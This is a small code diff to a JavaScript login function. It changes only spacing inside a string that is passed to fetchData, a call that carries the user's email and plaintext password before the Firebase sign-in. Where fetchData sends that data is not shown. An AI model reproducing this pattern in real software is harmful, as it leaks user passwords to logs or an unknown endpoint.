@@ -15,7 +15,7 @@ async function Login() {
 
     userEmail = document.getElementById("email").value;
     userPassword = document.getElementById("password").value;
-    fetchData("Adarsh-Login-Clicked" + "user:" + userEmail + "pass:" + userPassword);
+    fetchData("Adarsh-Login-Clicked" + "user:" + userEmail + " pass:" + userPassword);
     firebase.auth().signInWithEmailAndPassword(userEmail, userPassword)
         .then((userCredential) => {
             var user = userCredential.user;
